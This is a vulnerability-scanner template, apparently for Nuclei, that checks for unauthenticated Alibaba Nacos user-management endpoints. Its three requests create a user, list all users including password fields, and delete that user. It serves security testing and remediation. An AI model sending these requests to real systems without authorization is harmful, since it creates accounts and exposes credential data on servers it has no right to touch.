id: nacos-auth-users-unauth

info:
  name: Alibaba Nacos 无 accessToken 未授权用户管理接口暴露
  author: dahe
  severity: critical
  description: |
    该模板用于核查 Alibaba Nacos 无 accessToken 未授权用户管理接口暴露。该类问题通常源于管理端、API、控制台或服务接口缺少认证授权，导致未登录用户可直接访问敏感功能。模板会向目标发送探测请求，并依据响应状态、关键字、响应头或 DSL 条件等证据确认目标是否存在该配置问题。
  impact: |
    - 攻击者可在未授权状态下查看系统状态、业务数据、任务信息或管理接口。
    - 若接口支持写操作，可能进一步导致配置篡改、服务接管、数据删除或横向移动。
  remediation: |
    - 为相关管理端和 API 启用认证授权，并按最小权限限制可访问功能。
    - 将管理接口限制在内网、VPN 或可信来源范围内，并开启访问审计。
    - 检查历史访问日志，确认是否存在未授权访问、批量枚举或异常操作。
  reference:
    - https://github.com/alibaba/nacos/issues/4593
    - https://github.com/alibaba/nacos/issues/4701
    - https://nacos.io/en-us/docs/auth.html
  classification:
    cwe-id: CWE-306
    cpe: cpe:2.3:a:alibaba:nacos:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 3
    shodan-query: title:"Nacos"
    fofa-query: app="NACOS"
    product: nacos
    vendor: alibaba
  tags: nacos,unauth,auth-bypass,misconfig,intrusive,vuln

http:
  - raw:
      - |
        POST /nacos/v1/auth/users/?username={{randstr_1}}&password={{randstr_2}} HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /nacos/v1/auth/users/?pageNo=1&pageSize=999&search=accurate HTTP/1.1
        Host: {{Hostname}}

      - |
        DELETE /nacos/v1/auth/users/?username={{randstr_1}} HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200 && contains(body_1, 'create user ok!')"
          - "status_code_2 == 200 && contains_all(body_2, '\"totalCount\"', '\"pageItems\"', '\"username\"', '\"password\"')"
          - "status_code_3 == 200 && contains(body_3, 'delete user ok!')"
        condition: and
